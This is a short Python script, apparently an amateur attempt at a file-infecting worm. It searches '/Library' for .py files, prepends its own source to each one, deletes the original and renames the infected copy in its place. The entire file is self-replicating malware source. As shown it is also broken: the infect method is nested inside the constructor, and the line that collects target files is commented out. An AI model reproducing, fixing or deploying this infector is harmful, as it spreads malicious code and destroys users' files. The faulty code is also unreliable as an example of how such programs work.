import os

class worm():

    def __init__(self):

        # list of directories
        self.files = []
        self.temp = []
        # list of paths
        self.paths = []

        self.dirs = []

        # the virus that we are inserting into
        self.virus = open(__file__, 'r')

        # the initial path that we are searching along
        self.path = '/Library'

        for root, directories, files in os.walk(self.path):
            self.dirs.append(directories)
            # print(self.dirs)
            # self.temp.append(files)
        print(self.dirs[0])

        # if we found at least one file, print it
        if len(self.temp) > 0:
            # we only want the first element
            self.temp = self.temp[0]

        # find every python file that is not a cache file
        for file in self.temp:
            # filters out the cache file
            if '.py' in file and '.pyc' not in file:
                self.files.append('/'.join([self.path,file]))

        def infect(self):
            # infect every python file we found
            for file in self.files:
                # only open the files as read
                with open(file, 'r') as r:
                    # construct the name of the infected file
                    infected = (str(file) + '.infected')
                    # create the new, infected file
                    with open(infected, 'a') as w:
                        for line in self.virus.readlines():
                            w.write(line)
                        for line in r.readlines():
                            w.write(line)
                # remove the old file
                os.remove(file)
                # rename the infected file to the old file name
                os.rename(infected, file)

worm = worm()
worm.infect()
